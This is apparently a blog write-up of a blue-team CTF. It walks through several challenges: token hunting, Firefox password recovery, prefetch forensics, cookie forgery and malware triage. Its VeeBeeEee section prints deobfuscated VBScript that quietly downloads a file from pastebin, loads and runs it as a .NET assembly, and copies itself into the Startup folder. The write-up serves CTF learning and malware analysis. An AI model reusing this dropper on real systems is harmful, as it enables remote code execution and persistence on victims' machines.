## Backdoored Splunk 

For this challenge we had two materials provided: a website and a zip file. 

Inside the zip we can see the code of a splunk agent for windows machine. 
When navigating to the website, the following message was deplayed : 

![Splunk](https://www.hato0.xyz/images/ctf/huntress/backdoorSplunk.png)

Giving the fact that it requires an Authorization header and that we have sources maybe we can find the token inside it. 
Using grep on the files, we find the appropriate token. 

![Splunk](https://www.hato0.xyz/images/ctf/huntress/backdoorSplunk2.png)

Using this token with curl we can just access the website and get a base64 string. 

![Splunk](https://www.hato0.xyz/images/ctf/huntress/backdoorSplunk3.png)

This base64 is in fact the flag ! 

*flag: flag{60bb3bfaf703e0fa36730ab70e115bd7}*

## Dumpster Fire 

We are presented with a linux file system.
Dumping the `passwd` file we can spot a user named `Challenge`. 

Navigating to it we can identify a mozilla repertory and nothing else interesing. 

![dumpster](https://www.hato0.xyz/images/ctf/huntress/dumpster.png)

From there we can identify the profile and find the login.json file with encrypted credentials.
Using a [firefox decoder](https://github.com/unode/firefox_decrypt) we can extract the corresponding password and have the flag !

![dumpster](https://www.hato0.xyz/images/ctf/huntress/dumpster2.png)

*flag: flag{35446041dc161cf5c9c325a3d28af3e3}*

## Comprezz

This chall is really straightforward. You just need to add the `zip` extension to the given file and extract the content to read the flag ! 

![dumpster](https://www.hato0.xyz/images/ctf/huntress/comprezz.png)

*flag: flag{196a71490b7b55c42bf443274f9ff42b}*

## Where am I? 

This chall is not a real OSINT challenge so don't go down that way.
Analyzing the file properties we can find some base64 in the Title. 

![whereami](https://www.hato0.xyz/images/ctf/huntress/whereami.png)

Decoding this base64 we get a flag ! 

*flag: flag{b11a3f0ef4bc170ba9409c077355bba2)*

## Chicken Wings 

For this chall we have a string composed by emojies. 
The string is the following : `♐●♋♑❀♏📁🖮🖲📂♍♏⌛🖰♐🖮📂🖰📂🖰🖰♍📁🗏🖮🖰♌📂♍📁♋🗏♌♎♍🖲♏❝`

Typing google 'emoji to text decode', we were able to find the following [website](https://lingojam.com/WingDing).

Using this website, the decoding goes good and got the flag ! 

![chicken](https://www.hato0.xyz/images/ctf/huntress/chicken.png)

*flag: flag{e0791ce68f718188c0378b1c0a3bdc9e}*

## Wimble

This challenge start with a ZIP file. Extracting the content we find a Windows Imaging file. 

![wimble](https://www.hato0.xyz/images/ctf/huntress/wimble.png)

Extracting it got the PF files that we need to analyze as we will do in forensic thing (after all that's a blue team oriented CTF).

![wimble](https://www.hato0.xyz/images/ctf/huntress/wimble2.png)

Using PECmd we are able to analyze those PF files. Greping to the output searching for flag we are able to get it.

![wimble](https://www.hato0.xyz/images/ctf/huntress/wimble3.png)

*flag: flag{97f33c9783c21df85d79d613b0b258bd}*

## F12

This chall is the first chall with no resource and only a distant webserver. 

We have a web page with a button calling the function `ctf()`.

![F12](https://www.hato0.xyz/images/ctf/huntress/F12.png)

This function open a new window with a specific path :

    {{< highlight javascript "lineNos=false" >}}
function ctf() {
  window.open("./capture_the_flag.html", 'Capture The Flag', 'width=400,height=100%,menu=no,toolbar=no,location=no,scrollbars=yes');
}
    {{< /highlight >}}

Accessing directly to the page we get the flag ! 

![F12](https://www.hato0.xyz/images/ctf/huntress/F122.png)

*flag: flag{03e8ba07d1584c17e69ac95c341a2569}*

## VeeBeeEee 

From the introduction we know that the downloaded file as something to do with wmiscripts. 

Checking it we can actually see the magic bytes of `VBE` files (`#@~^`).
We will from there try to decode the content. To do so we will use the program done by one of the CTF author located in [github](https://github.com/JohnHammond/vbe-decoder/blob/master/vbe-decoder.py).

![veebee](https://www.hato0.xyz/images/ctf/huntress/veebee.png)

I will not but the uncleaned code here to protect your eyes but here is a cleanup version :

    {{< highlight visualbasic "lineNos=false" >}}
Set Object  = WScript.CreateObject("WScript.Shell") 
Set SObject = CreateObject("Shell.Application")
Set FObject = CreateObject("Scripting.FileSystemObject")
SPath   = WScript.ScriptFullName
Dim Code

Power = "PowerShell "
Path = "$f='C:\Users\Public\Documents\July.htm';"
Reqest = "if (!(Test-Path $f)){Invoke-WebRequest 'https://pastebin.com/raw/SiYGwwcz' -outfile $f  };"
PathString = SObject.NameSpace(7).Self.Path  "/"  WScript.ScriptName
InvokeReqest = "[System.Reflection.Assembly]::loadfile($f);"
ExecAssem = "[WorkArea.Work]::Exe()"
CollectThenReplace Power , Path , Reqest , InvokeReqest , ExecAssem
Return = Object.Run(Code, 0, true)
WScript.Sleep(50000)
For i = 1 To 5
if i = 5 Then
Paste(SPath)
End if
Next
Sub Paste(RT)
FObject.CopyFile RT,PathString
End Sub
    {{< /highlight >}}

The code perform an request to a `pastebin` then save the output to `July.htm` in the public document folder and execute it.
Visiting the pastebin, the flag is the only content. 

*flag: flag{ed81d24958127a2adccfb343012cebff}*

## Baking 

This challenge is using only a remote service. 

By connecting to it, an oven is display with some recipes with long times to cook.
We can see a cookie `in_oven` registered when we submit a recipe. 
![backing](https://www.hato0.xyz/images/ctf/huntress/backing.png)

Decoding this cookie we obtain the following json: `{"recipe": "Carrot Cake", "time": "10/11/2023, 15:07:08"}`. 
So that means we have the hand on the recipe and the time that it has been submitted.
Moving from there we will try the `Magic Cookie` recipe and set a very old date, encoding back to base64 and update the cookie. 
The send cookie is : `{"recipe": "Magic Cookies", "time": "10/11/2000, 15:07:08"}:eyJyZWNpcGUiOiAiTWFnaWMgQ29va2llcyIsICJ0aW1lIjogIjEwLzExLzIwMDAsIDE1OjA3OjA4In0=`.


Got the flag when refreshed. 

![backing](https://www.hato0.xyz/images/ctf/huntress/backing2.png)

*flag: flag{c36fb6ebdbc2c44e6198bf4154d94ed4}*


## Snake Oil

Learning from previous mistake, static analysis is fun but not really efficient. 

So for this chall given the executable we have we will go ahead and run it on a sandbox. 
We directly got the flag through the Ngrok process

![snakeOil](https://www.hato0.xyz/images/ctf/huntress/snakeOil.png)

*flag: flag{d7267ce26203b5cc69f4bab679cc78d2}*


## Crab

So we are presented with a DLL and a lnk exuting the DLL with the entry point DLLMain.

Decompiling it we can quickly check the exports functions.
3 functions are interesting, DLLMain, NtCheckOSArchitecture and TlsCallback_X.

Might indicate some external communication perform by the DLL for TlsCallback_X.
For NtCheckOSArchitecture, it should set some execution condition that we will probably need to meet to check the file dinamically. 

But we will start with DLLMain.
The DLLMain only seems to call NtCheckOSArchitecture.

Exploring it we found method.crab_rave::inject_flag.h5274a20ed59aab7d that seems to be the function printing the flag.

rAcbUUWWNFlqMbruiYOIsAyVQHS78orvMoJ8C6O4D3asAApB
-rr5-rr5-rr5-rr5-rr5-rr5-rr5-rr5-rr5-rr5-rr5-rr5-rr5-rr5-rr5-rr5-r

URL is stored in argv 3 of the reqwest::blocking::get.h91579b36988f2767
Called by void method.crab_rave::inject_flag.h5274a20ed59aab7

Unfortunately I do not have screen for the rest but essentially you have a decript function called with arguments. Those arguments represent the key and the date to decode. You have to look in memory for the data and just decode it (that's a AES encoding and a base64).

# Conclusion

This was a fun CTF, done with collegues. We finished up to the 49 place and manage to solve all the challenges. Thanks for this CTF Huntress ! 